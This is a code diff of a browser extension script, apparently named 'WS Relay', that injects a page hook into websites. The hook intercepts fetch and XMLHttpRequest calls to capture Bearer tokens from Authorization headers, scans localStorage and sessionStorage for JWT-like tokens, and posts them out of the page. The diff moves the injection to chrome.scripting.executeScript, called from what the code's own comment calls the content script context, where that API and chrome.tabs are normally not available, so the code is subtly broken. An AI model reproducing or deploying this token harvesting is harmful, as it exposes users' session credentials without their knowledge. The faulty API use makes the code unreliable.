@@ -46,16 +46,18 @@ window.addEventListener('message', (event) => {
 })
 
 // Inject a script into the page context to hook fetch/XMLHttpRequest
+// Using chrome.scripting.executeScript to avoid CSP violations
 function injectPageHook() {
-  const code = `(() => {
-    function sendToken(token) {
+  // Define the hook function that will be injected into MAIN world
+  const hookFunction = () => {
+    function sendToken(token: string) {
       try { window.postMessage({ type: 'WS_CAPTURE_TOKEN', token }, window.location.origin); } catch(_){}
     }
-    function extractBearer(value) {
+    function extractBearer(value: string | null): string | null {
       if (!value) return null; const m = String(value).match(/Bearer\s+([^\s]+)/i); return m ? m[1] : null;
     }
 
-    function getAuthFromHeaders(h) {
+    function getAuthFromHeaders(h: any): string | null {
       try {
         if (!h) return null;
         if (typeof h.get === 'function') {
@@ -72,7 +74,7 @@ function injectPageHook() {
     }
 
     const _fetch = window.fetch;
-    window.fetch = function(input, init) {
+    window.fetch = function(input: any, init?: any) {
       try {
         // Check Request object first
         if (input && typeof input === 'object' && 'headers' in input && input.headers) {
@@ -85,28 +87,82 @@ function injectPageHook() {
         const b2 = extractBearer(auth);
         if (b2) sendToken(b2);
       } catch(_){}
-      return _fetch.apply(this, arguments);
+      return _fetch.call(this, input, init);
     };
 
     const XHR = window.XMLHttpRequest;
     function XHRHook(){ return Reflect.construct(XHR, arguments, new.target); }
     XHRHook.prototype = XHR.prototype;
-    XHRHook.prototype.setRequestHeader = function(k, v){
+    XHRHook.prototype.setRequestHeader = function(k: string, v: string){
       try { if (String(k).toLowerCase() === 'authorization') { const t = extractBearer(v); if (t) sendToken(t); } } catch(_){}
-      return XHR.prototype.setRequestHeader.apply(this, arguments);
+      return XHR.prototype.setRequestHeader.call(this, k, v);
     };
-    window.XMLHttpRequest = XHRHook;
+    window.XMLHttpRequest = XHRHook as any;
 
     // Attempt to find tokens in storage as well
     try {
-      const scan = (s) => { for (let i=0;i<s.length;i++){ const val = s.getItem(s.key(i)); if(!val) continue; if (/^[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+$/.test(val)) { sendToken(val); return true; } try { const obj = JSON.parse(val); const c = [obj && obj.token, obj && obj.accessToken, obj && obj.idToken, obj && obj.authToken]; for (const x of c) { if (typeof x === 'string' && /^[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+$/.test(x)) { sendToken(x); return true; } } } catch(_){} } return false; };
+      const scan = (s: Storage) => { 
+        for (let i=0;i<s.length;i++){ 
+          const key = s.key(i);
+          if (!key) continue;
+          const val = s.getItem(key); 
+          if(!val) continue; 
+          if (/^[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+$/.test(val)) { 
+            sendToken(val); 
+            return true; 
+          } 
+          try { 
+            const obj = JSON.parse(val); 
+            const c = [obj && obj.token, obj && obj.accessToken, obj && obj.idToken, obj && obj.authToken]; 
+            for (const x of c) { 
+              if (typeof x === 'string' && /^[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+$/.test(x)) { 
+                sendToken(x); 
+                return true; 
+              } 
+            } 
+          } catch(_){} 
+        } 
+        return false; 
+      };
       if (!scan(window.localStorage)) scan(window.sessionStorage);
     } catch(_){}
-  })();`;
-  const s = document.createElement('script')
-  s.textContent = code
-  ;(document.head || document.documentElement).appendChild(s)
-  s.remove()
+  };
+
+  // Use chrome.scripting.executeScript to inject into MAIN world (CSP-compliant)
+  // Get current tab ID from the content script context
+  chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
+    if (tabs[0]?.id) {
+      chrome.scripting.executeScript({
+        target: { tabId: tabs[0].id },
+        world: 'MAIN',
+        func: hookFunction
+      }).catch((e) => {
+        console.warn('[WS Relay] Failed to inject page hook via scripting API:', e);
+        // Fallback: try the old method if scripting API fails
+        try {
+          const code = `(${hookFunction.toString()})();`;
+          const s = document.createElement('script');
+          s.textContent = code;
+          (document.head || document.documentElement).appendChild(s);
+          s.remove();
+        } catch (fallbackError) {
+          console.warn('[WS Relay] Fallback injection also failed:', fallbackError);
+        }
+      });
+    } else {
+      console.warn('[WS Relay] Could not get current tab ID, using fallback method');
+      // Fallback: try the old method if we can't get tab ID
+      try {
+        const code = `(${hookFunction.toString()})();`;
+        const s = document.createElement('script');
+        s.textContent = code;
+        (document.head || document.documentElement).appendChild(s);
+        s.remove();
+      } catch (fallbackError) {
+        console.warn('[WS Relay] Fallback injection also failed:', fallbackError);
+      }
+    }
+  });
 }
 
 injectPageHook()
